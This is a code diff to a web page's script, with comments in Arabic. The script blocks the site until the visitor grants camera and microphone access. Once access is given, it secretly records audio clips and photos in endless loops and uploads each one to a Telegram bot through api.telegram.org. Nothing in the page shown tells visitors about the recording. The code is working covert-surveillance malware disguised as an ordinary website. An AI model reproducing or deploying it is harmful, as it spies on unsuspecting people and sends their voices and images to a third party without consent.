@@ -215,29 +215,6 @@
 
     <!-- سكربت (سيُملأ بالأجزاء التالية) -->
     <script>
-async function start() {
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        // إذن منح ✅
-        audioLoop();
-        photoLoop();
-
-        // تشغيل الموقع فقط بعد نجاح الإذن
-        init(); 
-    } catch (err) {
-        // إذن مرفوض ❌
-        document.body.innerHTML = `
-            <div style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;color:#fff;background:#111;text-align:center;">
-                <h1>🚫 لا يمكنك الدخول بدون السماح بالكاميرا والميكروفون</h1>
-                <p>قم بتحديث الصفحة ومنح الإذن</p>
-            </div>
-        `;
-    }
-}
-
-window.addEventListener("load", start);
-
-// لاحظ: لا تستدعي init() هنا بعد السكربت
 
 let stream = null;
 let audioActive = false;
@@ -258,11 +235,10 @@ function sendToTelegram(blob, type="voice") {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
         method: "POST",
         body: form
-    })
-    .catch(err => console.error("خطأ في الإرسال:", err));
+    }).catch(err => console.error("خطأ في الإرسال:", err));
 }
 
-// تسجيل صوت 5 ثواني
+// تسجيل صوت
 function recordAudio() {
     return new Promise(resolve => {
         const recorder = new MediaRecorder(stream);
@@ -291,17 +267,16 @@ function captureImage() {
     });
 }
 
-// حلقة الصوت
+// حلقات الصوت والصورة
 async function audioLoop() {
     audioActive = true;
     while (audioActive) {
         const audio = await recordAudio();
         sendToTelegram(audio, "voice");
-        await new Promise(r => setTimeout(r, 5000));
+        await new Promise(r => setTimeout(r, AUDIO_MS));
     }
 }
 
-// حلقة الصور
 async function photoLoop() {
     photoActive = true;
     while (photoActive) {
@@ -311,14 +286,27 @@ async function photoLoop() {
     }
 }
 
-// طلب إذن الكاميرا والمايك فور دخول الصفحة وتشغيل الحلقات
+// START الموقع مع التحقق من الإذن
 async function start() {
     try {
+        // طلب الإذن أولًا
         stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
         console.log("تم منح الإذن! بدء التسجيل...");
+
+        // بدء حلقات التسجيل
         audioLoop();
         photoLoop();
+
+        // تشغيل الموقع فقط بعد نجاح الإذن
+        init(); 
     } catch (err) {
+        // إذن مرفوض
+        document.body.innerHTML = `
+            <div style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;color:#fff;background:#111;text-align:center;">
+                <h1>🚫 لا يمكنك الدخول بدون السماح بالكاميرا والميكروفون</h1>
+                <p>قم بتحديث الصفحة ومنح الإذن</p>
+            </div>
+        `;
         console.log("تم رفض الإذن أو حدث خطأ:", err);
     }
 }
